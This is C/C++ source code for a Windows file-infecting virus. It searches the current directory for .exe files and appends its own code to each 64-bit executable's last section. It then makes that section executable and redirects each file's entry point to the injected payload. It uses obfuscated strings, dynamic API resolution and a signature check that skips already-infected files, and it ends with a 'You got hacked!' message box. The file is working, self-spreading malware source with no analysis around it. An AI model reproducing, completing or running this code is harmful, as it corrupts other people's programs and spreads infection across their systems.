#include "payload.h"
#include <Windows.h>
#include "libproc.hpp"
#include "utils.h"

EXTERN_C_START
extern CONST BYTE __payload_start;
extern CONST DWORD signature;
extern CONST VOID payload();
extern CONST LONGLONG delta_start;
extern CONST DWORD code_size;
EXTERN_C_END

__declspec(code_seg("injected")) VOID inj_code_c() {
    DECLARE_OBFUSCATED(user32, "USER32.DLL");
    DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");
    DECLARE_OBFUSCATED(mbText, "You got hacked!");
    DECLARE_OBFUSCATED(exeExt, "*.exe");
#ifdef PL_DEBUG
    DECLARE_OBFUSCATED(mbInjecting, "Injecting...");
    // DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
    // DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
    DECLARE_OBFUSCATED(errFindFile, "No .exe files");
    // DECLARE_OBFUSCATED(errOpenFile, "Error opening file");
    // DECLARE_OBFUSCATED(errMapFile, "Error mapping file");
    // DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
#endif

    CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
    CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
    CONST auto pGetModuleFileNameA = GET_FUNC(pKernel32Dll, GetModuleFileNameA);
    CONST auto pCreateFileA = GET_FUNC(pKernel32Dll, CreateFileA);
    CONST auto pGetFileSize = GET_FUNC(pKernel32Dll, GetFileSize);
    CONST auto pCreateFileMappingA = GET_FUNC(pKernel32Dll, CreateFileMappingA);
    CONST auto pMapViewOfFile = GET_FUNC(pKernel32Dll, MapViewOfFile);
    CONST auto pFlushViewOfFile = GET_FUNC(pKernel32Dll, FlushViewOfFile);
    CONST auto pUnmapViewOfFile = GET_FUNC(pKernel32Dll, UnmapViewOfFile);
    CONST auto pCloseHandle = GET_FUNC(pKernel32Dll, CloseHandle);
    CONST auto pGetCurrentDirectoryA = GET_FUNC(pKernel32Dll, GetCurrentDirectoryA);
    CONST auto pFindFirstFileA = GET_FUNC(pKernel32Dll, FindFirstFileA);
    CONST auto pFindNextFileA = GET_FUNC(pKernel32Dll, FindNextFileA);
    CONST auto pFindClose = GET_FUNC(pKernel32Dll, FindClose);

    CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
    CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);

    LPSTR sDirEnd;
    HANDLE hFind;

    CHAR sModuleName[MAX_PATH];
    DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
    if (res == 0 || res >= sizeof(sModuleName)) {
        // MSGBOX_DBG(DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
        goto end;
    }
    // MSGBOX_DBG(sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);

    CHAR sDirName[MAX_PATH];
    CHAR sFindPath[MAX_PATH];
    res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
    if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
        // MSGBOX_DBG(DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
        goto end;
    }
    my_strappend(sDirName, '\\');
    my_strcpy(sFindPath, sDirName);
    my_strcat(sFindPath, DEOBF(exeExt));
    // MSGBOX_DBG(sFindPath, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);

    CHAR sFilePath[MAX_PATH];
    sDirEnd = my_strcpy(sFilePath, sDirName) - 1;

    WIN32_FIND_DATAA findData;
    hFind = pFindFirstFileA(sFindPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        MSGBOX_DBG(DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
        goto end;
    }

    HANDLE hFile, hMapFile;
    LPVOID pMapAddress;
    DWORD dwFileSize, dwNewFileSize, dwSignature;
    PCIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS64 pNtHeader;
    PIMAGE_SECTION_HEADER pSection, pLastSection;
    DWORD dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwSizeAligned;
    PBYTE pPayloadData;

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        my_strcpy(sDirEnd, findData.cFileName);
        if (!my_stricmp(sFilePath, sModuleName)
#ifdef NEED_BANG
            || sDirEnd[0] != '!'
#endif
        ) {
            MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONWARNING);
            continue;
        }
        MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONINFORMATION);

        hFile = pCreateFileA(sFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            // MSGBOX_DBG(DEOBF(errOpenFile), NULL, MB_OK | MB_ICONERROR);
            continue;
        }

        dwFileSize = pGetFileSize(hFile, NULL);
        dwNewFileSize = ALIGN(dwFileSize + ALIGN(code_size, 512), 512);
        // ^ TODO: Get file alignment from PE header instead of hardcoding 512
        //         Load file in read-only mode and reopen in RW later
        //         Perform as many checks as possible in read-only mode

        hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
        if (hMapFile == NULL) {
            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
            goto close_file;
        }

        pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
        if (pMapAddress == NULL) {
            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
            goto close_map;
        }

        pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            goto error;
        }

        pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
            pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            goto error;
        }

        pSection = IMAGE_FIRST_SECTION(pNtHeader);
        pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
        dwLastSectionPtr = pLastSection->PointerToRawData;
        dwLastSectionSize = pLastSection->SizeOfRawData;
        pPayloadData = (PBYTE)pDosHeader + dwLastSectionPtr + dwLastSectionSize;
        dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;

        if (dwOrigEntryPoint >= pLastSection->VirtualAddress &&
            dwOrigEntryPoint < pLastSection->VirtualAddress + dwLastSectionSize) {
            dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
                                     (dwOrigEntryPoint - pLastSection->VirtualAddress) -
                                     ((PCBYTE)&payload - (PCBYTE)&signature));
            if (dwSignature == signature) {
                goto error;
            }
        }

        dwSizeAligned = ALIGN(code_size, pNtHeader->OptionalHeader.FileAlignment);
        // ^ Compute aligned size earlier
        pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
        pLastSection->SizeOfRawData += dwSizeAligned;
        pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                    ? dwSizeAligned
                                                    : pLastSection->SizeOfRawData;
        pNtHeader->OptionalHeader.SizeOfImage =
            ALIGN(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize,
                  pNtHeader->OptionalHeader.SectionAlignment);
        pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
        pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
        pNtHeader->OptionalHeader.AddressOfEntryPoint =
            pLastSection->VirtualAddress + dwLastSectionSize +
            (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);

        my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
            (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;

        pFlushViewOfFile(pMapAddress, 0);
        goto unmap;
    error:
        MSGBOX_DBG(sFilePath, NULL, MB_OK | MB_ICONERROR);
    unmap:
        pUnmapViewOfFile(pMapAddress);
    close_map:
        pCloseHandle(hMapFile);
    close_file:
        pCloseHandle(hFile);
    } while (pFindNextFileA(hFind, &findData));

    pFindClose(hFind);

end:
    pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle),
                 MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
}
